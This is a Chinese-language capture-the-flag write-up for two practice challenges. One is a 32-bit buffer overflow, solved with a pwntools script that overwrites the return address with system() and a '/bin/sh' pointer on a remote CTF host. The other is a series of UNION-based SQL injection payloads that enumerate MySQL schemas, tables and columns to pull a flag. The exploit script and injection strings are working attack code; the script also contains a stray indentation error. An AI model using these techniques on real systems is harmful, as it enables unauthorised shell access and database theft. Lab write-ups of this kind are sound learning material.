# BW OJ 7.19思考

# PWN

### bof

使用IDA打开pwn，看到ebp-1Ch

![image-20230719102937145](E:\typora_pictures\image-20230719102937145.png)

又看到有system函数，找到system的地址是0x08048568（空格键可以在图形界面和文本界面之间切换）

![image-20230719104006837](E:\typora_pictures\image-20230719104006837.png)

又找到system中/bin/sh的地址是0x0804A02C

![image-20230719103025889](E:\typora_pictures\image-20230719103025889.png)

解题脚本为：

```python
from pwn import *
conn=remote('vps1.blue-whale.me',9990)
system_addr = 0x08048568
command = 0x0804A02C
 conn.recv()
conn.sendline(b'a'*(0x1c+4) + p32(system_addr) + p32(command))
conn.interactive()
```

运行后得到Flag:

![image-20230719104109186](E:\typora_pictures\image-20230719104109186.png)

## Web

### Basic SQL

基础知识补充：

*在`information_schema`数据库中，有一个名为`schemata`的表，该表记录了MySQL服务器上所有数据库的信息，包括数据库名称（`SCHEMA_NAME`）等。*



获取查询列数：

```
a' union select '1','2','3
```

获取回显位置：

![image-20230719104853356](E:/typora_pictures/image-20230719104853356.png)

接下来获取所有的数据库：

```
a' union select '1',(select group_concat(SCHEMA_NAME) from information_schema.schemata),'3
```

发现有两个数据库，Information_schema和news

![image-20230719105021243](E:/typora_pictures/image-20230719105021243.png)

看看当前数据库是什么名字：

```
a' union select '1',database(),'3
```

![image-20230719105133917](E:/typora_pictures/image-20230719105133917.png)

可以看到当前数据库叫news

接下来看到当前数据库的表名：

```
a' union select '1',(select group_concat(table_name) from information_schema.tables where table_schema=database()),'3
```

![image-20230719105728471](E:/typora_pictures/image-20230719105728471.png)

接下来开始获取字段名：

```
a' union select '1',(select group_concat(column_name) from information_schema.columns where table_name='f1agfl4gher3'),'3
```

![image-20230719105847480](E:/typora_pictures/image-20230719105847480.png)

最后获取Flag：

```
a' union select '1',(select h3r31sfl4g from f1agfl4gher3),'3
```

![image-20230719105918364](E:/typora_pictures/image-20230719105918364.png)